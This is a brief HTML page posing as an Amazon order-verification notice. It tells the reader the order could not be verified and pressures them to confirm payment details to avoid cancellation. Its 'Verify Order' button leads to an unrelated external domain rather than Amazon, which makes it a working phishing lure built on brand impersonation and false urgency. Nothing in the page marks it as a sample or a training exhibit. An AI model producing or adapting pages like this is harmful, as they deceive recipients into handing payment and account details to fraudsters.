<!DOCTYPE html>
<html>
<head>
    <title>Amazon - Order Verification</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; padding: 50px; }
        .amazon-box { background: white; border: 2px solid #FF9900; padding: 40px; max-width: 500px; margin: 0 auto; border-radius: 10px; }
        .btn { background: #FF9900; color: black; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="amazon-box">
        <h2 style="color: #FF9900;">Amazon</h2>
        <h3>Order Verification Required</h3>
        <p>We couldn't verify your recent order. Please confirm your payment details to avoid cancellation.</p>
        
        <a href="http://www.app-wp-whatsappweb.com.cn/" class="btn">Verify Order</a>
    </div>
</body>
</html>
